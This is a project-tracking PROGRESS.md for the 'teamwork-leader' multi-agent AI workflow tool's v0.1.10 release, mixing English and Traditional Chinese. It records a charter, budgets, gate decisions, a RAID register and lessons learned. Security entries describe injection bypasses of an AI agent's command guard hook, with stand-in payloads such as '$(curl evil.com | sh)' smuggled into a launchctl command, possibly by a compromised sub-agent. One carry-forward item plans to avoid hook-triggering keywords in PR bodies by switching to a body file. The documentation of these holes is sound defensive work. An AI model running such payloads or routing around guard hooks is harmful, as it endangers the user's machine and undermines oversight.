# Project: teamwork-leader v0.1.10 — Daemon FROZEN-spec changes + RAID收尾 + PM-discipline 強化

## Project root: /Users/HsuTse/ClaudeProject/teamwork-leader

<!--
Schema authority: skills/teamwork-leader-workflow/references/progress-md-schema.md
TeamLead is the SOLE WRITER of this file. PMs return JSON payloads; TeamLead serializes.
Stale guard (mtime + sha256) runs immediately before every write.
Hard ceiling: 2000 lines. Archival rules per §11.6.

v0.1.9 archived to: docs/archives/PROGRESS.v0.1.9.md (charter complete, COMPLETED state).
v0.1.9 tasks archived to: docs/archives/tasks.v0.1.9.md.
v0.1.9 measurement archived to: docs/archives/measurement.v0.1.9.md (I-023-M1 closed; cold p50=15.5s / warm p50=5.3s).

V19-I-7 (macos-13 x86_64 retry) — archived as CLOSED-ACCEPTED at v0.1.10 open: arm64-only accepted as new normal per macos-13 GitHub deprecation timeline; not carried forward.
-->

## Charter

**Goal**: Close daemon FROZEN-spec deltas (I-061 array structure / I-064 single-line format / I-065 argparse mutually_exclusive_group / I-071 post-hoc keys) deferred from v0.1.9 per Opus PlanAudit B1 anti-staleness ruling, AND finalize v0.1.9 surfaced RAID 收尾 (RAID-I-SCHEMA-1 PO meta schema reinforcement / RAID-I-2 protocol-vs-workflow timeout text harmonization / 3 Gate_Req findings — real-claude end-to-end measurement on 本機+GHA + cold-headroom doc + python3 ≥3.10 hard assert).

**Background**: v0.1.9 charter shipped (cold p50=15.5s / warm p50=5.3s ≤30s) but deferred 4 daemon FROZEN-spec changes to v0.1.10 because Stage 3 modifications would invalidate Stage 1+2 measurement evidence. v0.1.9 hook whitelist work (this session, pre-charter) added scoped `launchctl` `ask`-downgrade for teamwork-leader daemon plist/label, enabling 本機 real-launchd validation path that was previously blocked.

**Discovery answers**:
- **Q1 主題**: Daemon-focused (A+B); C/D/E 留 v0.1.11+
- **Q2 DoD**: 最高 coverage — A 全 + B 全含 real-claude (本機 + GHA 雙驗證)
- **Q3 Constraints**: anti-scope-creep mandate 繼承 + branch-discipline (feat/v0.1.10-* + PR + separate merge verb) + FROZEN-spec 變更需 Opus PlanAudit 明示「FROZEN-DELTA-AUTHORIZED v0.1.10」 + real-claude 驗證限本機同一 host (跨機型留 v0.1.11)

**Success criteria (DoD — must-have)**:
- **AC-1** I-061 daemon array structure 重構落入 `scripts/daemon.py` + `docs/specs/auto-resume-daemon-design.md` 對應段落 (FROZEN-DELTA-AUTHORIZED v0.1.10)
- **AC-2** I-064 single-line format normalization 落入 daemon code + spec
- **AC-3** I-065 argparse mutually_exclusive_group 重構落入 daemon code + spec
- **AC-4** I-071 post-hoc TeamLead-coined keys 收斂 (rename → canonical naming) 落入相關 lib / hook / doc
- **AC-5** RAID-I-SCHEMA-1: PO PM intake / dispatch-header 加 `meta` schema 整數型別自檢機制 (pre-emit guard)
- **AC-6** RAID-I-2: spec §C-4 timeout 60s vs workflow 90s text gap 統一 (protocol harmonization)
- **AC-7** Gate_Req #1: real-claude end-to-end measurement 在 (i) 本機 macOS host (Hook 白名單路徑) AND (ii) GHA macos-14 reference host 雙處執行；session_resumed 真實達成；evidence archived to `docs/archives/measurement-real-claude.v0.1.10.md`
- **AC-8** Gate_Req #2: cold p50 52% headroom note 寫入 `docs/specs/auto-resume-daemon-design.md §reliability budget`
- **AC-9** Gate_Req #3: `measure-execution.yml` 加 `python3 --version >= 3.10` 硬 assert 步驟 (env-class hard gate)
- **AC-10** Ad-hoc Security PM 完成 hook 白名單 attack surface 評估 + 留 RAID-I 或 advisory note (依結論)
- All Stage Gates pass (Forward + Human + Requirement)
- Step E independent Opus final review verdict APPROVED or APPROVED_WITH_REVISIONS (revisions applied)
- Tag v0.1.10 published on main after PR merge (CEO_Gate_Final approve covers PR-open only per v0.1.8 L-2; merge requires separate `merge` verb)

**Constraints**:
- **Anti-scope-creep mandate** (v0.1.7+v0.1.8+v0.1.9 inheritance): 任何超出 AC-1..AC-10 的擴張 = CCB-Heavy。明確 out-of-scope:
  - C 4 polish (TWL_EVIDENCE_DIR / commit scope `cleanup` / L-4 codification / L-2 escape-clause) → v0.1.11+
  - D PM-discipline 強化 (PO meta self-check 除外 — 已含 AC-5; charter-goal completeness check / RD 8-field schema / QA pre-exec attribution audit) → v0.1.11+
  - E Process recalibration (CCB-Light cap-rule / GHA Node 24 deprecation) → v0.1.11+
  - 跨機型 cross-host real-claude validation → v0.1.11
- **FROZEN-spec 變更 explicitly authorized**: Opus PlanAudit dispatch 必含「FROZEN-DELTA-AUTHORIZED v0.1.10 — sections X, Y, Z」明示注記；無此注記不動 frozen 區塊
- **Branch**: `feat/v0.1.10-daemon-spec-changes` from main `64aba8d`
- **Worktree**: in-place (option b — code + doc + measurement 混合，跨 stage 進展用 in-place 較簡)
- **Reviewer cadence override**: Auto Mode active; CEO consents to `step_review_mandatory=true` + `plan_audit_reviewer=opus` + `final_review_independent=true` (v0.1.7-v0.1.9 precedent)

**Charter immutability**: per design doc §5.5.1, this section is APPENDED ONLY (no in-place edits) after CEO_Gate_0 sign-off. Material change → CCB-Heavy.

**APPENDED 2026-05-10 per CCBH-v0.1.10-AC7-DEMOTE-V0.1.11** (CCB-Heavy approve via CEO ESCALATED `revise_charter` verb):
- **AC-7 demoted v0.1.10 must-have → v0.1.11-deferred**. Empirical evidence in `docs/specs/measurement-protocol.v0.1.10.md §methodology-deviations` deviation-3 (本機 PROVEN-UNAVAILABLE env-class) + deviation-4 (GHA PROVEN-INTEGRATION-GAP). v0.1.10 ship gate proceeds without AC-7. Real-claude/daemon integration engineering carried as `RAID-V11-real-claude-integration` sev:HIGH (gating prerequisite for any v0.1.11 AC-7 retry).
- AC-1..AC-6 + AC-8 + AC-9 + AC-10 all met. AC-7 deferred but proven-blocked (NOT silent skip per `feedback_silent-deviation-prohibited.md`).
- Tag v0.1.10 publishes per CEO_Gate_Final approve (this charter's last AC line).

## Communication: 繁體中文（台灣）

— TeamLead 主回覆 + PM dispatch summary + AskUserQuestion + Last Action 敘述全繁中（schema name / enum value / code 保留英文）。Source: `~/.claude/projects/-Users-HsuTse-ClaudeProject-teamwork-leader/memory/feedback_language.md`.

## Budget Baseline

### Stage decomposition (rolling-wave, 2-stage charter post Discovery lock)

| Stage | Name | Scope summary | Decomposition depth |
|---|---|---|---|
| 1 | Daemon FROZEN-spec changes + RAID 文本收尾 | A (I-061/I-064/I-065/I-071) + B (RAID-I-SCHEMA-1 + RAID-I-2) + Ad-hoc Security review | full WBS at PLANNING |
| 2 | Real-claude end-to-end measurement + hard assert | Gate_Req #1 本機+GHA 雙驗證 + #2 doc + #3 yml hard assert | milestone-level (refined at WaveRefinement) |

### Per-stage kT baseline

| Item | kT |
|---|---|
| Stage 1 daemon (4 sub-tasks A) | 130 |
| Stage 1 RAID 文本 (RAID-I-SCHEMA-1 + RAID-I-2) | 50 |
| Stage 1 Ad-hoc Security PM hook attack-surface review | 30 |
| Stage 1 step-reviews + KMR + Opus PlanAudit | 60 |
| **Stage 1 total** | **270** |
| Stage 2 real-claude measurement (本機+GHA) | 200 |
| Stage 2 Gate_Req #2 doc + #3 yml hard assert | 30 |
| Stage 2 step-reviews + KMR | 30 |
| Gate_Requirement runner (final, 50-100 kT cited) | 80 |
| **Stage 2 total** | **340** |
| Final Opus review (independent) | 30 |
| ProjectClose (per-PM + CleanupGate + MemoryEntry) | 30 |
| **Project total (no contingency)** | **670** |
| Contingency | 50 |
| **Project total** | **~720 kT** |

### Circuit breaker thresholds

| Trigger | Threshold | Action |
|---|---|---|
| Stage 1 80% warning | 216 kT | flag + offer re-baseline at next gate |
| Stage 1 100% hard breach | 270 kT | mandatory CEO check-in mid-stage |
| Stage 2 80% warning | 272 kT | flag + offer re-baseline at next gate |
| Stage 2 100% hard breach | 340 kT | mandatory CEO check-in mid-stage |
| 2× cumulative project | 1440 kT | halt; CCB-Heavy required |

### Knobs

| Knob | Value |
|---|---|
| `pms` | PO + RD + QA + Ad-hoc Security (UX skip; Ad-hoc DevOps skip — GHA Node 24 deprecation 留 v0.1.11) |
| `retry_cap_per_gate` | 2 |
| `retry_cap_per_step` | 1 |
| `parallel_pm_limit` | 2 |
| `gate_requirement_mode` | `final_only` (Stage 2 = final) |
| `step_review_mandatory` | **true** (CEO override; v0.1.7-v0.1.9 precedent) |
| `plan_audit_reviewer` | **opus** (CEO override) |
| `final_review_independent` | **true** (ProjectClose Opus reviewer; v0.1.7-v0.1.9 precedent) |
| `trust_tier_mode` | `enabled` |
| `kmr_mode` | `enabled` |
| `schema_enforcement_mode` | `strict` |
| `plan_audit_anti_self_skip_mode` | `strict` |

### CEO sign-off

- Approved at: 2026-05-08T03:10+08:00
- Verb: approve (CEO_Gate_0)
- Notes: Charter shape locked single Discovery; DoD = Most-coverage (A 全 + B 全含 real-claude 本機+GHA); Constraints = anti-scope-creep + branch-discipline + FROZEN-DELTA-AUTHORIZED notation + same-host real-claude only; Worktree = in-place; TeamFormation = PO+RD+QA + Ad-hoc Security (hook whitelist attack surface review)

## Active Stage: 2 — Real-claude end-to-end measurement (本機+GHA dual) — closed PARTIAL via CCB-Heavy
## State: COMPLETED
## CEO_Gate_Final: 2026-05-10T09:44:22+08:00 verb=approve (3-verb gate; tag + PR-open authorized; merge requires separate `merge` verb per v0.1.8 L-2 codification)
## Project closure: v0.1.10 ProjectClose ceremony complete — Phases A-E + F (this gate) executed; Phase G tag v0.1.10 + PR `feat/v0.1.10-daemon-spec-changes → main` to follow.
## Last Action: 2026-05-10T09:44:22+08:00 [TRUSTED] — Stage 2 closed PARTIAL via CCB-Heavy `revise_charter` (CCBH-v0.1.10-AC7-DEMOTE-V0.1.11; canonical record at `docs/decisions/ccb-log.md §Heavy events`). State chain: ESCALATED → REPORTING → AWAITING_CEO → COMPLETED. Phases A-G executed: A PROGRESS write → B PO doc batch (commit `4239f48`) → C 4-PM LL (PO+RD‖QA+Sec; 20 lessons + 1 NEW security RAID) → D CleanupGate PASS no-action → E MemoryEntry → F CEO_Gate_Final approve → G tag v0.1.10 + [PR #14](https://github.com/HsuTse/teamwork-leader/pull/14) OPEN. Cross-references: StageReport at `## Stage History ### Stage 2`; 5 v0.1.11 carry RAIDs at `## RAID Register §Stage 2 → v0.1.11`; LL aggregation at `## Lessons Learned`; production usage signal at `## Lessons Learned ### Production usage feedback`.

## Stage 2 ESCALATED → revise_charter (archived to Stage History below)
## CEO selection: 2026-05-10T09:03:41+08:00 verb=revise_charter (recommended path)
## CCB-Heavy: CCBH-v0.1.10-AC7-DEMOTE-V0.1.11 verb=approve (decided 2026-05-10 via ESCALATED 4-verb selection; full CR at ## CCB Activity below)

> Stage 2 ESCALATED snapshot (2026-05-08) compacted into `## Stage History ### Stage 2` StageReport (Outcome / Gates / RAID Burndown / Value / Token / Self-Audit / Lessons). Full original ESCALATED prose preserved at git commit `ce29aae`.

---

## Stage 1 closure (archived to Stage History below)
## CEO_Gate_1: 2026-05-08T04:30+08:00 verb=approve

---

## Stage 1 closed
## State: AWAITING_CEO  ← (historical; replaced by Stage 2 PLANNING above)
## Last Action (Stage 1 close): 2026-05-08T04:25+08:00 [TRUSTED] — QA Gate_Forward V0.1.10-S1-G1 verdict **PASS** (Sonnet, ~18 kT). 15 verify commands re-run independently; 14/15 confirmed; 1 dispatch-doc gap noted (T-1-A2 verify omitted baton.json setup — non-blocker). AC matrix: AC-1 met (cosmetic-as-doc per CCBL-AC1-WORDING) / AC-2 met (single-line failure_message + deferral deleted) / AC-3 met (argparse mutex; combined flags exit 2; solo regression PASS) / AC-4 met (§4.X subsection lines 545+; AC-4-H/I/J in §4.X; NOT in 7-row table) / AC-5 met (po-pm.md pre-emit guard table line 86; 5 int + 2 enum + 1 bool fields) / AC-6 met (measurement-protocol.v0.1.10.md timeout 90 + evidence-truth; v0.1.9 untouched) / AC-10 met (151L evidence file 6 sections; _LAUNCHCTL_TEAMLEAD_RE + _COMPOUND_OP_RE both verified; compound regex 4/4 cases) / AC-7/8/9 deferred to Stage 2. Cross-PM verification (T-1-A2 + T-1-A3 re-run) match RD self-report. Two non-functional findings (LOW): (a) compound regex `[;|]` denies bare-pipe by design per evidence file caveat (b) T-1-A2 dispatch verify command omitted baton setup — both documented, not blockers. **Gate_Human declared N/A** per CCBL-Stage1-v0.1.10-GATE-HUMAN-NA (non-interactive scope: daemon code + spec doc + hook + agent intake + protocol; zero UI surface; v0.1.9 M-4 precedent + `feedback_silent-deviation-prohibited.md` requires explicit registration). **Gate_Requirement deferred** per `gate_requirement_mode=final_only` (Stage 2 = final). CCB cap-rule audit: 5 stage-total = cap; suppression escape hatch invoked (atomic-from-single-event closures: PlanAudit + CEO menu + Gate declarations; no chronic drift). State → AWAITING_CEO. Stage 1 closure StageReport written below; Stage 2 wave-refinement written below; CEO_Gate_1 surfaced via AskUserQuestion next.

## RAID Register

### Stage 2 active

- **[I] RAID-I-S2-launchctl-hook** — sev:HIGH | owner: RD | source: V0.1.10-S2-EX1. **DECISION 2026-05-08T05:30 (TeamLead Auto Mode per Opus partial_acceptable rule + [HsuTse] blanket authorization)**: chose **Option C** (Accept T-2-1 BLOCKED; GHA = sole real-claude evidence host). Empirical block proof: system python3 3.9.6 + hook hard-deny escalation logs. Status: closed-deferred — install-lifecycle hardening (Option B template fix or Option A permission rule) carried forward to v0.1.11 RAID. Charter AC-7(i) → PROVEN-UNAVAILABLE on this host class; AC-7 overall PARTIAL with empirical pre-val proof. CCBL-Stage2-v0.1.10-T21-LOCAL-BLOCKED applied (methodology-deviation-3 in measurement-protocol.v0.1.10.md to be added at evidence-finalization).
- **[I] RAID-I-S2-GHA-prevalidation-trigger** — sev:MED | owner: RD | source: V0.1.10-S2-EX1. **CLOSED 2026-05-08**: subsequent push of wip commit (bedff96) triggered push event correctly; GHA pre-validation workflow ran successfully (run 25521618249, 26s PASS). Root cause documented for future reference: GHA push trigger only fires for new workflow files after the workflow is registered on the branch. No further action.
- **[I] RAID-I-Stage2-GHA-claude** (PLANNING-time, sev:HIGH) — **CLOSED 2026-05-08**: pre-validation PASS confirms real claude IS available on GHA macos-14 (npm install -g @anthropic-ai/claude-code, claude 2.1.132, ~2s install, no auth prompts). Candidate A selected. Status: closed-confirmed-available.

### Stage 2 → v0.1.11 carry-forward (registered at Stage 2 close 2026-05-10)

- **[I] RAID-V11-real-claude-integration** — sev:HIGH | owner: RD/QA (v0.1.11) | source: AC-7(ii) PROVEN-INTEGRATION-GAP (deviation-4). Daemon's `_wait_for_session_resumed` polling target was implicitly designed against stub-claude artifact format. Real claude (`claude --resume <session-id>`) does not produce equivalent observable signal. v0.1.11 work: (a) characterize what real claude produces on `--resume` (4 hypothesis vectors documented at `docs/archives/measurement-real-claude-gha.v0.1.10.md §root-cause-analysis`); (b) update daemon polling target OR claude-side hook OR baton schema accordingly; (c) re-run AC-7(ii) measurement. **Blocks all real-claude measurement on any host class** until shipped. Status: open-v0.1.11.
- **[I] RAID-V11-install-lifecycle-python3-path** — sev:MED | owner: RD (v0.1.11) | source: AC-7(i) PROVEN-UNAVAILABLE (deviation-3). plist template hard-codes `/usr/bin/python3` (Apple system 3.9.6 on macOS 15.3); launchd does not consult user shell PATH so user pyenv/brew upgrade does NOT unblock. v0.1.11 fix: plist template `{{PYTHON3_PATH}}` substitution variable + `install.py` env discovery (find first python3 ≥3.10 from PATH or env override). Once shipped, deviation-3 superseded. Status: open-v0.1.11.
- **[I] RAID-V11-ccb-token-cost** — sev:MED | owner: TeamLead/PO (v0.1.11) | source: production usage feedback Finding 1 (per `## Lessons Learned ### Production usage feedback`). CCB ceremony (especially CCB-Heavy template + ccb-log row + impact analysis table) reported as token-cost friction. v0.1.11 candidate fixes: (a) streamline CCB-Light template (drop optional sections); (b) loosen cap rules with calibration data; (c) auto-collapse related CCB-Light entries into one row when same-section repeats; (d) make ccb-log append PO-batchable instead of per-event. Status: open-v0.1.11.
- **[I] RAID-V11-pm-subagent-disclosure** — sev:MED | owner: TeamLead/RD (v0.1.11) | source: production usage feedback Finding 2 (per `## Lessons Learned ### Production usage feedback`). `dispatch-header.md:72` already requires PMs to declare sub-agent dispatch at PlanAudit + count toward `parallel_pm_limit`, BUT return contract has no `sub_agent_invocations` field — TeamLead and CEO cannot verify compliance from PM JSON. CC UI does not display nested agent invocations. v0.1.11 fix: (a) add `sub_agent_invocations: [{subagent_type, scope, justification, planaudit_approval_ref, return_summary}]` to dispatch-header §Return contract; (b) TeamLead persists array to `docs/audit-trail.jsonl` per dispatch; (c) anti-rubber-stamp Rule N (extension): if PM returned with sub-agent invocation but no PlanAudit approval ref → INCOMPLETE → re-dispatch. Per Sec PM LL-SEC-5: also security-class dimension (compounds with RAID-SEC-V11-backtick-subshell-injection). Status: open-v0.1.11.
- **[I] RAID-V11-pm-excerpt-embedding** — sev:LOW | owner: TeamLead (v0.1.11) | source: post-ProjectClose `/simplify` E-F1 efficiency review. Phase C LL dispatch (4 PMs) had each PM independently Read+Grep PROGRESS.md sections; TeamLead already had context. Workflow tooling fix: TeamLead produces frozen excerpt once + embeds in all PM prompts. Estimated savings ~5-7 kT per ProjectClose ceremony. Status: open-v0.1.11.
- **[I] RAID-V11-gate-batching** — sev:LOW | owner: TeamLead (v0.1.11) | source: post-ProjectClose `/simplify` E-F2. When CleanupGate returns 0 session-products (foregone PASS), fold confirmation into CEO_Gate_Final as 2-question AskUserQuestion instead of 2 sequential single-question gates. Codify in `references/pmp-lessons-learned.md` as "ProjectClose AskUserQuestion batching when prior gate is no-op". Status: open-v0.1.11.
- **[I] RAID-V11-pr-body-hook-preflight** — sev:LOW | owner: TeamLead (v0.1.11) | source: post-ProjectClose `/simplify` E-F3 + Phase G live demo. Before `gh pr create` heredoc, grep planned PR body for hook-trigger keywords (e.g. daemon-mgmt command literal); if hit → use `--body-file` from start instead of retry-after-block. Same applies to commit messages and any HEREDOC bash. Add to PMP/ProjectClose checklist. Status: open-v0.1.11.
- **[D] RAID-V11-cleanup-gate-sonnet-skip-criterion-doc** — sev:LOW (decision/doc-only, no code) | owner: TeamLead (v0.1.11) | source: post-ProjectClose `/simplify` E-F4. Add to `references/pmp-lessons-learned.md` §Step 6 CleanupGate: "if `ls -la` surface-area scan returns 0 session-products AND all artifacts within retention window → skip Sonnet enumerator, inline TeamLead PASS with evidence". Estimated savings ~8-12 kT per future ProjectClose where applicable. Status: open-v0.1.11.
- **[I] RAID-V11-hook-drift-verification** — sev:MED | owner: TeamLead/Ad-hoc Security (v0.1.11) | source: `/opus-review` Reviewer B I-5. Out-of-tree hook (`~/.claude/hooks/pretooluse_guard.py`) + in-repo evidence pattern lacks SHA256 / hash tie-back; host hook can silently regress (manual edit, machine reinstall, future hardening doc rewrite) without CI assertion. v0.1.11 fix: commit canonical hook SHA256 under `docs/security/`; SessionStart skill or Makefile target asserts current hook hash matches; flag drift to user. Compounds with RAID-SEC-V11-backtick-subshell-injection (no way to verify residual vector fix is actually deployed). Status: open-v0.1.11.
- **[I] RAID-V11-tag-self-evidence-vs-gitignored-progress** — sev:MED | owner: TeamLead (v0.1.11) | source: `/opus-review` Reviewer C I-6. CCBH row + CHANGELOG `### Changed` reference `PROGRESS.md ## Charter APPENDED / ## RAID Register §Stage 2 → v0.1.11` as evidence, but PROGRESS.md is in `.gitignore` (per self-dogfood discipline). Violates `feedback_tag-commit-self-evidence.md`: governance-state references not committed are unverifiable from tag commit alone. v0.1.11 fix candidates: (a) extract committed `docs/reports/v0.1.10-projectclose-report.md` (or vN.M close-report convention) capturing Charter / Last Action / RAID Register snapshots at tag time; (b) commit a non-gitignored `docs/PROGRESS.snapshot.vN.M.md` at each ship; (c) accept tension and document why (PROGRESS.md is per-charter ephemeral, downstream user PROGRESS.md may carry secrets). Status: open-v0.1.11.
- **[I] RAID-V11-workflow-install-safety** — sev:MED | owner: TeamLead/RD (v0.1.11) | source: `/opus-review` Reviewer B B-3. `.github/workflows/measure-execution-prevalidation.yml:58` uses `npm install -g @anthropic-ai/claude-code || echo "INSTALL_FAILED"` which masks non-zero exit (defeats `set -e`); main workflow installs unpinned `@anthropic-ai/claude-code` (claude 2.1.132 → 2.1.133 between pre-val and main run; supply-chain drift trusted implicitly). v0.1.11 fix: replace with explicit `if ! npm install -g @anthropic-ai/claude-code@<pinned>; then echo "::error::install failed"; exit 1; fi`; pin version with `--save-exact` or hash check. Status: open-v0.1.11.
- **[I] RAID-V11-d1-control-char-rendering** — sev:LOW | owner: Ad-hoc Security (v0.1.11) | source: `/opus-review` Reviewer B B-4. D-1 ask-prompt embeds `cmd[:120]!r` (Python repr of user-controlled string) into operator UI; control characters (ANSI escape, BEL, embedded `\n`) inside cmd are repr-quoted but terminal may interpret them — operator-side display injection / spoofing surface. v0.1.11 fix: strip non-printable bytes before formatting (e.g. `cmd[:120].encode('unicode_escape').decode('ascii')` or charset whitelist). Compounds with RAID-V11-hook-drift-verification (fix needs to actually deploy). Status: open-v0.1.11.

- **[R] RAID-SEC-V11-backtick-subshell-injection** — sev:MED | owner: Ad-hoc Security PM (v0.1.11) | source: Phase C LL Ad-hoc Security PM LL-SEC-3 introspection. D-3 `_COMPOUND_OP_RE = re.compile(r"[;|]|&&|\|\|")` blocks `;`, `|`, `&&`, `||` but does NOT cover backtick subshell (`` `cmd` ``) or `$()` process substitution. Attack: `launchctl bootstrap gui/501 com.teamwork-leader.auto-resume-daemon.plist $(curl evil.com | sh)` — top-level regex returns None, exception fires, downgraded to `ask` prompt showing `cmd[:120]` which may display only legitimate prefix if injection tail beyond 120 chars. Exploit precondition: attacker controls `cmd` string (met in compromised PM sub-agent scenario per RAID-V11-pm-subagent-disclosure — compounding vector). Independently verified via `grep -n _COMPOUND_OP_RE docs/security/v0.1.10-hook-hardening.md` (line 57 + 90 confirm exact regex). v0.1.11 fix: extend `_COMPOUND_OP_RE` to `r'[;|` + '`' + r']|&&|\|\||\$\('` (backtick + dollar-paren); consider also redirection operators (`>`, `>>`, `<`) as lower-priority secondary vectors. Status: open-v0.1.11.

### Stage 1 active

- **[I] V0.1.10-I-1 measurement-protocol path discrepancy** — sev:low | owner: PO | source: PO V0.1.10-S1-D1. Charter line 13 + dispatch references `docs/archives/measurement-protocol.v0.1.9.md` but actual file lives at `docs/specs/measurement-protocol.v0.1.9.md`. Next action: confirm canonical location at PlanAudit / EXECUTING; update single source of truth | status: open
- **[I] V0.1.10-I-2 hook-whitelist-opaque-ask-reason (D-1)** — sev:med | owner: Ad-hoc Security | source: V0.1.10-S1-D3. Current `emit("ask", "launchctl operation on teamwork-leader daemon — confirm intent.")` shows no command context to user; social-engineering surface on approve prompt. Next action: D-1 ~1 LOC fix — include first ~120 chars of `cmd` in reason string. Decision deferred to Opus PlanAudit (in-scope vs v0.1.11). status: open
- **[I] V0.1.10-I-3 hook-whitelist-open-path-branch (D-2)** — sev:med | owner: Ad-hoc Security | source: V0.1.10-S1-D3. Third regex branch `teamwork-leader/[^\s]*\.plist` permits arbitrary plist filename if `teamwork-leader/` is a path segment; FN-3 attacker-controlled-plist scenario. Next action: D-2 ~2 LOC fix — collapse third branch to exact filename `com.teamwork-leader.auto-resume-daemon.plist`. Decision deferred to Opus PlanAudit. status: open
- **[I] V0.1.10-I-4 hook-whitelist-compound-operator-injection (D-3)** — **sev:high** | owner: Ad-hoc Security | source: V0.1.10-S1-D3. FN-1 — `launchctl bootstrap … teamwork-leader/legit.plist; curl evil | sh` matches regex → user sees benign reason → trailing `;` clause executes. Next action: D-3 ~6-8 LOC fix — strip/detect `;`/`&&`/`||`/`|` compound operators before exception fires. Decision deferred to Opus PlanAudit (sev:high suggests in-scope this charter). status: open
- **[A] V0.1.10-A-1 RD advisory: AC-4-H/I/J labeling** — **CLOSED 2026-05-08** by CCBL-Stage1-v0.1.10-AC4-PLACEMENT (separate §4.X subsection per Opus C1 attribution-truth).
- **[I] V0.1.10-I-1 measurement-protocol path discrepancy** — **DECISION 2026-05-08**: canonical location `docs/specs/measurement-protocol.v0.1.9.md` confirmed; new v0.1.10 protocol also at `docs/specs/`; charter line 13 path correction folded into T-1-B2 EXECUTING edit pass. status: open (close at T-1-B2 commit)
- **[I] V0.1.10-I-2 hook-whitelist-opaque-ask-reason (D-1)** — **IN-SCOPE v0.1.10** per Opus PlanAudit + CCBL-AC10-EVIDENCE; closure at T-1-A5. Reassigned next action: D-1 ~1 LOC fix in `~/.claude/hooks/pretooluse_guard.py` line 455 — include first ~120 chars of `cmd` in ask reason string. status: in_progress
- **[I] V0.1.10-I-3 hook-whitelist-open-path-branch (D-2)** — **IN-SCOPE v0.1.10**; closure at T-1-A5. Reassigned next action: D-2 ~2 LOC fix — collapse third regex branch from `teamwork-leader/[^\s]*\.plist` to exact filename `com.teamwork-leader.auto-resume-daemon.plist`. status: in_progress
- **[I] V0.1.10-I-4 hook-whitelist-compound-operator-injection (D-3)** — **IN-SCOPE v0.1.10 MANDATORY (sev:HIGH)**; closure at T-1-A5. Reassigned next action: D-3 ~6-8 LOC fix — strip/detect `;`/`&&`/`||`/`|` compound operators before exception fires; CAVEAT add unit test for over-blocking case (legitimate compound `&&` in operator scripts). Hook is OUTSIDE repo — code edit out-of-tree; in-repo evidence at `docs/security/v0.1.10-hook-hardening.md`. status: in_progress

### v0.1.10 candidate carry-forward (informational; final scope at CEO_Gate_0)

**A. Daemon FROZEN-spec changes** (Opus B1 deferred from v0.1.9):
- I-061 daemon array structure
- I-064 single-line format
- I-065 argparse mutually_exclusive_group
- I-071 post-hoc TeamLead-coined keys

**B. v0.1.9 surfaced RAID收尾**:
- RAID-I-SCHEMA-1 (PO `meta` prose-vs-integer schema reinforcement)
- RAID-I-2 (spec §C-4 timeout 60s vs workflow 90s text gap)
- 3 Gate_Requirement reliability findings (stub validity boundary / cold 52% headroom / macOS Python 3.10+ hard assert)

**C. 4 polish (v0.1.7+v0.1.8 carry-forward)**:
- TWL_EVIDENCE_DIR trust note
- commit scope `cleanup` novelty
- L-4 normative codification (advisory→MUST ratchet)
- L-2 escape-clause tightening

**D. PM-discipline 強化 (v0.1.9 lessons-learned would-differently)**:
- PO pre-emit `meta` 整數自檢 + CCB-Light running tally
- RD 8-field schema checklist + GHA YAML context-scope check
- QA pre-execution attribution audit + scope-expansion CLAIMED→TRUSTED 把關
- stage-runbook §step-review-rubric charter-goal-completeness sub-criterion

**E. Process / governance**:
- CCB-Light cap-rule 校準（v0.1.9 7-stage-total over ≥5 signal）
- GHA Node.js 20 deprecation upgrades（actions/checkout / setup-python / upload-artifact）

### v0.1.7+v0.1.8+v0.1.9 closed records (READ-ONLY reference)

- [I] I-023-M1 — CLOSED v0.1.9（cold p50=15.5s / warm p50=5.3s ≤30s ship gate）
- [I] L-2 normative codification — CLOSED v0.1.9（stage-runbook advisory→MUST landed）
- [I] V19-I-1..V19-I-7 — all closed/mitigated/accepted at v0.1.9
- [I] L-1 (kpi-deferral) — CLOSED v0.1.9 measurement closure
- [I] L-3 (host-environment) — CLOSED v0.1.9 GHA macos-14 reference host

## Lessons Learned

> Phase C aggregation 2026-05-10. 4 PMs dispatched (PO + RD parallel || QA + Ad-hoc Security parallel); 20 lessons total across mandatory taxonomy. Detailed prose preserved in MemoryEntry `project_v0.1.10-stage2-escalated.md`. v0.1.7-0.1.9 lessons in `project_v0.1.{7,8,9}-*.md`.

### What worked

- **(PO) LL-PO-1** — FROZEN-spec APPENDED-only immutability pattern held under CCB-Heavy pressure (Charter line 57 APPENDED block + deviation-3/4 registration; Stage 2 Gate_Forward NOT-RUN explicit registration with rationale).
- **(PO) LL-PO-5** — Deviation registration as evidence-truth correctly prevented phantom success on AC-7 (deviation-3 + deviation-4 forced ESCALATED rather than silent PARTIAL tag; CEO 4-verb produced correct outcome).
- **(RD) LL-RD-3** — Out-of-tree edit + in-repo evidence pattern held cleanly (D-1+D-2+D-3 hook hardening at `~/.claude/hooks/pretooluse_guard.py` + `docs/security/v0.1.10-hook-hardening.md` 151L; git diff clean; worth codifying in `references/discipline/surgical-change.md`).
- **(RD) LL-RD-4** — Cosmetic-as-doc disposition for FROZEN-spec deltas resolved cleanly (CCBL-AC1-WORDING I-061; comment-only edit at scripts/daemon.py lines 38-41; no Stage 2 fallout).
- **(QA) LL-QA-1** — Explicit non-blocker classification at Gate_Forward (Stage 1 V0.1.10-S1-G1: 14/15 + named miss + written rationale + cross-PM verify match — distinguishes "checked and acceptable" from "didn't notice").
- **(QA) LL-QA-2** — Gate_Human N/A registration via named CCB-Light anchor (Stage 1 + Stage 2 each registered via CCBL-GATE-HUMAN-NA per silent-deviation-prohibited.md; structural-absence rationale documented).
- **(Sec) LL-SEC-1** — D-3 sev:HIGH compound-operator fix correctly scoped (`_COMPOUND_OP_RE` blocks `;`, `|`, `&&`, `||`; T5/T6 smoke confirmed FN-1/FN-2 attack denials; intentional over-blocking of legitimate compound launchctl is correct security tradeoff).
- **(Sec) LL-SEC-2** — D-2 exact-filename path lockdown (collapsed `teamwork-leader/[^\s]*\.plist` → `com\.teamwork-leader\.auto-resume-daemon\.plist`; eliminated FN-3 attacker-controlled-path; 2 LOC fix with high security-value/cost ratio; transferable pattern: any allow-list regex with `[^\s]*` in path segment is sev:MED tightening candidate).

### What didn't work

- **(PO) LL-PO-2** — CCB-Light ceremony token-cost disproportionate to governance value at small-charter scale (7 CCB-Light + 1 CCB-Heavy v0.1.10; cap-rule escape hatch invoked Stage 1; production usage independently surfaced same friction; CCBL-T24-ANCHOR ~3 kT for negligible-risk clarification). → carried as RAID-V11-ccb-token-cost.
- **(PO) LL-PO-3** — AC anchor ambiguity (CCBL-T24-ANCHOR) caught at Stage 2 PLANNING not at CEO_Gate_0 (AC-8 cited `§reliability budget` section that doesn't exist in design.md). PO discipline gap: literal anchor-existence grep should be CEO_Gate_0 review item.
